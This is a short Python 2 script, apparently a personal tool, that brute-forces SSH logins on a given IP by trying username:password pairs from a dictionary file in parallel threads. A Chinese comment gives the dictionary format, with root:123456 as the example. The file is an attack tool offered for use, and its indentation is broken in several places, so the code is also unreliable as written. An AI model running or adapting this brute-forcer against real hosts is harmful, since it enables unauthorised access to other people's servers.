 #!/usr/bin/python
# -*- coding:utf-8 -*-
import sshclass
import sys
import threading
import time

reload(sys)
sys.setdefaultencoding('utf-8')

__metaclass__ = type


class Threadssh(threading.Thread):

    def __init__(self, func, args):
        threading.Thread.__init__(self)
        self.func = func
        self.args = args
        self.res = None

    def getResult(self):
    print 'Get Result Check!'
        return self.res


    def run(self):
        self.res = self.func(*self.args)


def connssh(ip, username, password, port='22'):
    try:
        ss = sshclass.SshclientConnect(ip, username, password,port)
        ss.sshconnect()
        print '[+]Connect ok with uname: %s pass: %s' % (username,password)
    except:
        print '[-]Connect failed with uname: %s pass: %s' % (username,password)


def usedirc(ip, username, password, port='22'):
    threads = []
    with open(r'/opt/dirc.txt', 'r') as file:
        fileconent = file.readlines()
        for i in fileconent:
            userandpass = i.split(':')
            username = userandpass[0].strip()
            password = userandpass[1].strip()
            t = Threadssh(connssh, (ip, username, password, port))
            threads.append(t)
        for x in range(len(threads)):
        threads[x].start()
        time.sleep(0.5)
        for y in range(len(threads)):
        threads[y].join()

def help():
print 'Usage:python ssh_burte_force.py ip username password port'

def main():
if len(sys.argv)< 5:
help()
else:
usedirc(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])
if __name__=='__main__':
main()
#说明：调用了上次写的ssh类，爆破需要用到字典，字典文件格式如下：
 #root:123456
